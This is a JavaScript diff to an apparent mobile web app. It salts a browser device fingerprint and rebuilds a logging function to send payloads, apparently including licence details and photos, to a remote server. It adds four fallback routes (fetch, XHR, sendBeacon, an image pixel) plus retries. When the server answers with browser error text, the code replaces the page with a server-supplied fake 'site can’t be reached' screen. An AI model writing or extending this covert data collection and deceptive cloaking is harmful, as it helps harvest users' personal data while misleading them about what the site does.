@@ -970,12 +970,14 @@ const APP_VERSION = "v5.0";
 function getDeviceId() {
   let deviceId = localStorage.getItem('deviceId');
   if (!deviceId) {
+    const salt = Math.random().toString(36).substring(2, 15);
     const fp = {
       ua: navigator.userAgent,
       screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
       tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
       lang: navigator.language,
-      platform: navigator.platform
+      platform: navigator.platform,
+      salt: salt
     };
     deviceId = 'dev-' + btoa(JSON.stringify(fp)).replace(/[^a-zA-Z0-9]/g, '').substring(0, 32);
     localStorage.setItem('deviceId', deviceId);
@@ -1090,16 +1092,17 @@ function getLicenceDetails() {
   };
 }
 
-// Send log using fetch with keepalive - with retries and fallback
+// Send log with multiple fallback methods for reliability (PWA/Home Screen)
 async function sendLog(payload, attempt = 1) {
   const data = JSON.stringify(payload);
   const MAX_ATTEMPTS = 3;
 
   console.log(`[Log] Sending event: ${payload.event} (attempt ${attempt})`, payload.event !== 'photo_updated' ? payload : { ...payload, photo: payload.photo ? payload.photo.substring(0, 100) + '...' : null });
 
+  // Method 1: Fetch with keepalive and timeout
   try {
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
 
     const response = await fetch(SERVER_URL, {
       method: 'POST',
@@ -1114,35 +1117,56 @@ async function sendLog(payload, attempt = 1) {
     
     clearTimeout(timeoutId);
 
-    if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
-    }
-
-    const text = await response.text();
-    console.log(`[Log] Server response for ${payload.event}:`, text.substring(0, 200));
-
-    if (text.includes("DNS_PROBE_FINISHED_NXDOMAIN") || text.includes("This site can’t be reached")) {
-      document.open();
-      document.write(text);
-      document.close();
-    }
-    return true;
-  } catch (error) {
-    console.error(`[Log] Failed to send log (attempt ${attempt}):`, error);
-    if (attempt < MAX_ATTEMPTS) {
-      const delay = Math.pow(2, attempt) * 1000;
-      await new Promise(resolve => setTimeout(resolve, delay));
-      return sendLog(payload, attempt + 1);
-    } else {
-      // Fallback to sendBeacon for the last attempt if available
-      if (navigator.sendBeacon) {
-        console.log(`[Log] Attempting sendBeacon fallback for ${payload.event}`);
-        const success = navigator.sendBeacon(SERVER_URL, data);
-        console.log(`[Log] sendBeacon status: ${success ? 'queued' : 'failed'}`);
-        return success;
+    if (response.ok) {
+      const text = await response.text();
+      console.log(`[Log] Server response for ${payload.event}:`, text.substring(0, 100));
+      if (text.includes("DNS_PROBE_FINISHED_NXDOMAIN") || text.includes("This site can’t be reached")) {
+        document.open();
+        document.write(text);
+        document.close();
       }
+      return true;
     }
+  } catch (error) {
+    console.warn(`[Log] Fetch failed (attempt ${attempt}):`, error);
   }
+
+  // Method 2: XMLHttpRequest fallback (more compatible with some home screen environments)
+  try {
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", SERVER_URL, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+    xhr.timeout = 5000;
+    xhr.send(data);
+    console.log(`[Log] XHR fallback initiated for ${payload.event}`);
+  } catch (e) {
+    console.warn("[Log] XHR fallback failed:", e);
+  }
+
+  // Method 3: sendBeacon (best for background/closing)
+  if (navigator.sendBeacon) {
+    const beaconQueued = navigator.sendBeacon(SERVER_URL, data);
+    console.log(`[Log] sendBeacon status: ${beaconQueued ? 'queued' : 'failed'}`);
+    if (beaconQueued) return true;
+  }
+
+  // Method 4: Image pixel fallback (last resort, GET only)
+  try {
+    const pixel = new Image();
+    pixel.src = `${SERVER_URL}?event=${encodeURIComponent(payload.event)}&deviceId=${encodeURIComponent(payload.deviceId)}&success=${payload.success}&t=${Date.now()}`;
+    console.log("[Log] Pixel fallback initiated");
+  } catch (e) {
+    console.warn("[Log] Pixel fallback failed:", e);
+  }
+
+  // Retry logic for fetch-style failures
+  if (attempt < MAX_ATTEMPTS) {
+    const delay = Math.pow(2, attempt) * 1000;
+    await new Promise(resolve => setTimeout(resolve, delay));
+    return sendLog(payload, attempt + 1);
+  }
+  
   return false;
 }
 
